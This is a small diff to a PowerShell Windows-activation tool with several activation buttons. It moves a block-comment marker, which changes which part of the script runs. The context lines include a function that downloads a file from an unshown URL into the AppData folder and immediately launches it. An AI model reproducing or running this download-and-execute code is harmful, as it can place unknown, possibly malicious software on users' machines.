@@ -251,7 +251,7 @@ Clear-Host
 (New-Object System.Net.WebClient).DownloadFile($WebFile,"$env:APPDATA\$ProcName")
 Start-Process ("$env:APPDATA\$ProcName") 
 }
-
+#>
 
 
 # Activation 1
@@ -286,7 +286,7 @@ $ActivateWindows2.Add_Click({ ActivateWindows2 })
 $ActivateWindows3.Add_Click({ ActivateWindows3 })
 $ActivateWindows4.Add_Click({ ActivateWindows4 })
 $ActivateWindows5.Add_Click({ ActivateWindows5 })
-#>
+
 
 
 
